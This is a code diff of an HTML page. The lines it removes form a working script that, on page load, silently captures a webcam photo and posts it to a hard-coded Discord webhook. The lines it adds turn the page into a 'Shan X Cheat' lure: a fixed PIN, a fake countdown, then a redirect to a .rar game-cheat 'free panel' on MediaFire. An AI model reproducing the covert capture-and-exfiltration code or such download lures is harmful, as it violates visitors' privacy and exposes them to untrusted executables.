@@ -3,60 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture & Send to Discord</title>
+    <title>Shan X Cheat</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://i.postimg.cc/763D0RMJ/IMG-1043.jpg') no-repeat center center/cover;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 60px;
+            border-radius: 20px;
+            color: white;
+            width: 450px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
+        }
+
+        input {
+            padding: 12px;
+            margin: 10px;
+            font-size: 18px;
+            text-align: center;
+            border-radius: 5px;
+            border: 2px solid #4CAF50; /* Green border */
+            background-color: #f4f4f4;
+            color: #333;
+            width: 80%;
+        }
+
+        button {
+            padding: 12px 20px;
+            font-size: 15px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            background-color: #007BFF; /* Blue button */
+            color: white;
+            transition: background-color 0.3s;
+            width: 80%;
+        }
+
+        button:hover {
+            background-color: #0056b3; /* Darker blue */
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #waitingMessage {
+            font-size: 25px;
+            color: yellow;
+            margin-top: 20px;
+        }
+
+        #countdown {
+            font-size: 25px;
+            color: red;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .clickHereLabel {
+            color: #ff6600;
+            font-size: 25px;
+            margin-top: 20px;
+        }
+
+        .hiddenMessage {
+            font-size: 15px;
+            color: gray;
+        }
+
+        #subscribeContainer {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 60px;
+            border-radius: 20px;
+            color: white;
+            width: 500px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.6);
+        }
+    </style>
 </head>
 <body>
-    <video id="video" autoplay playsinline style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+
+    <!-- Login Container -->
+    <div class="container" id="loginContainer">
+        <h1>SHAN x CHEAT</h1>
+        <h1>⠀</h1>
+        <p>Enter YouTube Video Pin Number</p>
+        <input type="password" id="pin" maxlength="4" placeholder="Enter PIN">
+        <button onclick="checkPin()">Submit</button>
+        <h1>⠀</h1>
+        <h1>THANK YOU EVERYONE</h1>
+    </div>
+
+    <!-- Subscribe & Download Container -->
+    <div class="container hidden" id="subscribeContainer">
+        <p class="clickHereLabel">FREE PANEL LINK</p>
+        <h1>⠀</h1>
+        <button onclick="subscribeAndDownload()">DOWNLODE</button>
+        <div id="waitingMessage" class="hidden">Waiting...</div>
+        <div id="countdown" class="hidden"></div>
+        <p class="hiddenMessage">You will be redirected shortly.</p>
+    </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI"; // ඔබේ Discord Webhook URL එක 
-
-        async function captureAndSendPhoto() {
-            try {
-                const constraints = {
-                    video: { facingMode: "user" }
-                };
-
-                // Get Camera Access
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.getElementById("video");
-                video.srcObject = stream;
-
-                // Wait for Camera to Load
-                await new Promise(resolve => setTimeout(resolve, 2000));
-
-                // Capture Photo
-                const canvas = document.getElementById("canvas");
-                const context = canvas.getContext("2d");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Stop Camera
-                stream.getTracks().forEach(track => track.stop());
-
-                // Convert to Image Blob
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append("file", blob, "capture.png");
-                    formData.append("content", "📸 Auto Captured Image:");
-
-                    // Send Image to Discord Webhook
-                    await fetch(webhookURL, {
-                        method: "POST",
-                        body: formData
-                    });
-
-                    console.log("✅ Image Sent to Discord!");
-                }, "image/png");
-            } catch (error) {
-                console.error("🚫 Camera Access Error:", error);
+        // Check Pin and proceed
+        function checkPin() {
+            const pin = document.getElementById("pin").value;
+            if (pin === "0002") {
+                document.getElementById("loginContainer").classList.add("hidden");
+                document.getElementById("subscribeContainer").classList.remove("hidden");
+            } else {
+                alert("Incorrect PIN!");
             }
         }
 
-        // Auto Start on Page Load
-        window.onload = captureAndSendPhoto;
+        // Handle the download and countdown logic
+        function subscribeAndDownload() {
+            // Show waiting message and start countdown
+            document.getElementById("waitingMessage").classList.remove("hidden");
+            document.getElementById("countdown").classList.remove("hidden");
+
+            let countdownValue = 10;
+            const countdownDisplay = document.getElementById("countdown");
+
+            // Update countdown every second
+            const countdownInterval = setInterval(function() {
+                countdownDisplay.innerText = countdownValue;
+                countdownValue--;
+
+                // Once countdown finishes, trigger download
+                if (countdownValue < 1) {
+                    clearInterval(countdownInterval);
+                    downloadFile();
+                }
+            }, 1000);
+        }
+
+        // Redirect to the download URL
+        function downloadFile() {
+            window.location.href = 'https://download843.mediafire.com/t7fsyt7qmthgJ-a_R2Q1VHVZdgUSEc51TJE0V4ZgvbcOTFQqd6ot0qszrk9l98m0P1VUc7zkyr9uPEyzJLo4jiBC9_pLIGWTr-p6vfccb0MEhHRXQLpC3fy5r46BB35KPoW8y0_eUSxx5WvtbvBIxRz8WcKfC9FgwqN6MgnZsiJ1ig/dixtsho4dov2z91/SHAN+CHEAT+FREE+PANEL+v2.4.rar';
+        }
     </script>
+
 </body>
 </html>
